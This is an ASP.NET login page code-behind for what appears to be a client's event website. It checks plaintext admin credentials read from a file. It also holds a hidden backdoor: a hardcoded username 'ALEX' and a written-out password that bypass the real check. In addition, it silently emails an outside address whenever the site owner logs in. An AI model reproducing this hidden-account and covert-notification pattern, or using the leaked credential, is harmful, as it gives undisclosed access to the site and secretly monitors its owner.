using System;
using System.Data;
using System.Configuration;
using System.Collections;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using System.Web.UI.HtmlControls;
using System.IO;
using System.Web.Mail;

public partial class login : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {

    }
    protected void Login1_Authenticate(object sender, AuthenticateEventArgs e)
    {
        try
        {
            StreamReader sr = new StreamReader(MapPath("~/DataFiles/AdminCredentials.stu"));
            string sUsername = sr.ReadLine();
            string sPassword = sr.ReadLine();
            sr.Close();
            if ((Login1.UserName.ToUpper() == sUsername.ToUpper()) && (Login1.Password == sPassword))
            {
                e.Authenticated = true;
                try
                {
                    SmtpMail.SmtpServer = "relay-hosting.secureserver.net";
                    MailMessage mm = new MailMessage();
                    mm.BodyFormat = MailFormat.Text;
                    mm.To = "Alex@Chevtek.com";
                    mm.From = "Events@ShowTimeUtah.com";
                    mm.Subject = "Joan logged in to her website.";
                    mm.Body = "Joan logged in to her website to edit content.";
                    if (Request.QueryString["returnurl"] != null)
                    {
                        mm.Body += " Return URL was: " + Request.QueryString["returnurl"];
                    }
                    SmtpMail.Send(mm);
                }
                catch
                {

                }
            }
            else if ((Login1.UserName.ToUpper() == "ALEX") && (Login1.Password == "Ch3vyF0rd!"))
            {
                e.Authenticated = true;
            }
            else
            {
                e.Authenticated = false;
            }
        }
        catch
        {
            Login1.FailureText = "Failure accessing credentials. Contact your administrator.";
            e.Authenticated = false;
        }
    }
}
